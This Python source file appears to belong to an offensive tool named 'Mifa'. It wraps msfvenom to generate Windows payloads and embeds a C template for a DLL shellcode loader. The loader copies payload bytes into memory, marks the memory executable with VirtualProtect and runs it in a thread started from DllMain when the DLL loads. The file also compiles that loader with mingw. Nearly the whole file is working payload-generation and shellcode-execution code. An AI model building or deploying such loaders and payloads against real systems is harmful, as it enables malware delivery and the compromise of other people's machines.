from pathlib import Path
import shutil
import subprocess
import uuid

from providers.base import PayloadProvider


class MsfvenomProvider(PayloadProvider):
    provider_id = "msfvenom"

    SUPPORTED_FORMATS = {
        "raw": ".bin",
        "dll": ".dll",
        "exe": ".exe",
    }

    ADAPTER_COMPILERS = {
        "x64": "x86_64-w64-mingw32-gcc",
        "x86": "i686-w64-mingw32-gcc",
    }

    def _run_command(
        self,
        command,
        label
    ):
        try:
            completed = subprocess.run(
                command,
                check=False,
                capture_output=True,
                text=True,
                timeout=120,
            )

        except subprocess.TimeoutExpired as exc:
            raise RuntimeError(
                f"{label} timed out"
            ) from exc

        if completed.returncode != 0:
            detail = (
                completed.stderr.strip()
                or completed.stdout.strip()
                or f"unknown {label} error"
            )

            raise RuntimeError(
                f"{label} failed: {detail}"
            )

        return completed

    def _render_dll_adapter(
        self,
        payload_bytes
    ):
        rows = []

        for offset in range(
            0,
            len(payload_bytes),
            16
        ):
            chunk = payload_bytes[
                offset:offset + 16
            ]

            rows.append(
                "    "
                + ", ".join(
                    f"0x{value:02x}"
                    for value in chunk
                )
                + ","
            )

        payload_array = "\n".join(
            rows
        )

        return f'''#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stddef.h>

static const unsigned char g_payload[] = {{
{payload_array}
}};

static DWORD WINAPI
mifa_payload_worker(
    LPVOID parameter
)
{{
    (void)parameter;

    const SIZE_T payload_len =
        sizeof(g_payload);

    LPVOID memory = VirtualAlloc(
        NULL,
        payload_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (memory == NULL)
        return 1;

    unsigned char *destination =
        (unsigned char *)memory;

    for (
        SIZE_T i = 0;
        i < payload_len;
        i++
    ) {{
        destination[i] =
            g_payload[i];
    }}

    DWORD old_protect = 0;

    if (!VirtualProtect(
            memory,
            payload_len,
            PAGE_EXECUTE_READ,
            &old_protect))
    {{
        VirtualFree(
            memory,
            0,
            MEM_RELEASE
        );

        return 2;
    }}

    if (!FlushInstructionCache(
            GetCurrentProcess(),
            memory,
            payload_len))
    {{
        VirtualFree(
            memory,
            0,
            MEM_RELEASE
        );

        return 3;
    }}

    typedef void (*MIFA_ENTRY)(void);

    MIFA_ENTRY entry =
        (MIFA_ENTRY)memory;

    entry();

    VirtualFree(
        memory,
        0,
        MEM_RELEASE
    );

    return 0;
}}

BOOL WINAPI DllMain(
    HINSTANCE instance,
    DWORD reason,
    LPVOID reserved
)
{{
    (void)instance;
    (void)reserved;

    if (reason == DLL_PROCESS_ATTACH)
    {{
        HANDLE thread = CreateThread(
            NULL,
            0,
            mifa_payload_worker,
            NULL,
            0,
            NULL
        );

        if (thread == NULL)
            return FALSE;

        CloseHandle(
            thread
        );
    }}

    return TRUE;
}}
'''

    def _build_dll_adapter(
        self,
        raw_path,
        output_path,
        architecture,
        compiler_override=None
    ):
        if architecture not in self.ADAPTER_COMPILERS:
            raise ValueError(
                "DLL adapter requires architecture "
                "'x64' or 'x86'"
            )

        compiler_name = (
            str(compiler_override).strip()
            if compiler_override
            else self.ADAPTER_COMPILERS[
                architecture
            ]
        )

        compiler_path = shutil.which(
            compiler_name
        )

        if compiler_path is None:
            raise FileNotFoundError(
                "DLL adapter compiler not found: "
                f"{compiler_name}"
            )

        raw = raw_path.read_bytes()

        if not raw:
            raise RuntimeError(
                "msfvenom produced an empty raw payload"
            )

        source_path = (
            output_path.parent
            / (
                "."
                + output_path.stem
                + ".adapter.c"
            )
        )

        source_path.write_text(
            self._render_dll_adapter(
                raw
            ),
            encoding="utf-8",
        )

        command = [
            compiler_path,
            str(source_path),
            "-shared",
            "-o",
            str(output_path),
            "-O2",
            "-s",
            "-Wall",
            "-Wextra",
            "-Werror",
        ]

        try:
            self._run_command(
                command,
                "DLL adapter compilation"
            )

        finally:
            source_path.unlink(
                missing_ok=True
            )

        if (
            not output_path.exists()
            or output_path.stat().st_size == 0
        ):
            raise RuntimeError(
                "DLL adapter compiler completed "
                "without creating a DLL"
            )

        return Path(
            compiler_path
        ).name

    def resolve(
        self,
        source,
        **options
    ):
        payload = str(
            source or ""
        ).strip()

        if not payload:
            raise ValueError(
                "msfvenom payload module is required"
            )

        if any(
            char.isspace()
            for char in payload
        ):
            raise ValueError(
                "msfvenom payload module must not "
                "contain whitespace"
            )

        output_format = str(
            options.get(
                "format",
                "raw"
            )
        ).strip().lower()

        if (
            output_format
            not in self.SUPPORTED_FORMATS
        ):
            raise ValueError(
                "Unsupported msfvenom format: "
                f"{output_format}"
            )

        architecture = str(
            options.get(
                "architecture",
                ""
            )
        ).strip()

        if architecture not in {
            "x64",
            "x86",
            ""
        }:
            raise ValueError(
                "Unsupported msfvenom architecture: "
                f"{architecture}"
            )

        platform = str(
            options.get(
                "platform",
                "windows"
            )
        ).strip().lower()

        if platform != "windows":
            raise ValueError(
                "Mifa msfvenom provider currently "
                "supports Windows payloads only"
            )

        strategy = str(
            options.get(
                "strategy",
                (
                    "adapter"
                    if output_format == "dll"
                    else "direct"
                )
            )
        ).strip().lower()

        if strategy not in {
            "direct",
            "adapter",
        }:
            raise ValueError(
                "Unsupported msfvenom strategy: "
                f"{strategy}"
            )

        if (
            strategy == "adapter"
            and output_format != "dll"
        ):
            raise ValueError(
                "msfvenom adapter strategy currently "
                "supports DLL output only"
            )

        binary = str(
            options.get(
                "binary",
                "msfvenom"
            )
        ).strip()

        binary_path = shutil.which(
            binary
        )

        if binary_path is None:
            raise FileNotFoundError(
                "msfvenom executable not found: "
                f"{binary}"
            )

        raw_options = options.get(
            "msf_options",
            []
        )

        if raw_options is None:
            raw_options = []

        if not isinstance(
            raw_options,
            (list, tuple)
        ):
            raise ValueError(
                "msf_options must be a list"
            )

        msf_options = []

        for item in raw_options:
            value = str(item).strip()

            if (
                not value
                or "=" not in value
            ):
                raise ValueError(
                    "Each msfvenom option must use "
                    "KEY=VALUE syntax"
                )

            key, option_value = (
                value.split(
                    "=",
                    1
                )
            )

            if (
                not key.strip()
                or not option_value
            ):
                raise ValueError(
                    "Each msfvenom option must use "
                    "KEY=VALUE syntax"
                )

            msf_options.append(
                value
            )

        output_dir_option = options.get(
            "output_dir"
        )

        if output_dir_option:
            output_dir = (
                Path(
                    output_dir_option
                )
                .expanduser()
                .resolve()
            )

        else:
            output_dir = (
                Path(__file__)
                .resolve()
                .parents[1]
                / "payloads"
                / "generated"
            )

        output_dir.mkdir(
            parents=True,
            exist_ok=True
        )

        token = uuid.uuid4().hex[:12]

        extension = (
            self.SUPPORTED_FORMATS[
                output_format
            ]
        )

        output_path = (
            output_dir
            / f"msfvenom-{token}{extension}"
        )

        compiler_used = None
        generator_format = output_format
        raw_path = None

        if (
            output_format == "dll"
            and strategy == "adapter"
        ):
            generator_format = "raw"

            raw_path = (
                output_dir
                / f".msfvenom-{token}.bin"
            )

            generated_path = raw_path

        else:
            generated_path = output_path

        command = [
            binary_path,
            "-p",
            payload,
        ]

        if architecture:
            command.extend(
                [
                    "-a",
                    architecture,
                ]
            )

        command.extend(
            [
                "--platform",
                platform,
            ]
        )

        command.extend(
            msf_options
        )

        command.extend(
            [
                "-f",
                generator_format,
                "-o",
                str(generated_path),
            ]
        )

        try:
            self._run_command(
                command,
                "msfvenom generation"
            )

            if (
                not generated_path.exists()
                or not generated_path.is_file()
            ):
                raise RuntimeError(
                    "msfvenom completed without "
                    "creating an output artifact"
                )

            if generated_path.stat().st_size == 0:
                raise RuntimeError(
                    "msfvenom produced an empty artifact"
                )

            if (
                output_format == "dll"
                and strategy == "adapter"
            ):
                compiler_used = (
                    self._build_dll_adapter(
                        raw_path=raw_path,
                        output_path=output_path,
                        architecture=architecture,
                        compiler_override=options.get(
                            "compiler"
                        ),
                    )
                )

        except Exception:
            output_path.unlink(
                missing_ok=True
            )

            raise

        finally:
            if raw_path is not None:
                raw_path.unlink(
                    missing_ok=True
                )

        return {
            "provider":
                self.provider_id,

            "path":
                output_path,

            "provenance": {
                "provider":
                    self.provider_id,

                "producer":
                    "msfvenom",

                "payload":
                    payload,

                "format":
                    output_format,

                "strategy":
                    strategy,

                "generator_format":
                    generator_format,

                "architecture":
                    architecture or None,

                "platform":
                    platform,

                "compiler":
                    compiler_used,

                "source_name":
                    output_path.name,

                "source_path":
                    str(output_path),
            },
        }
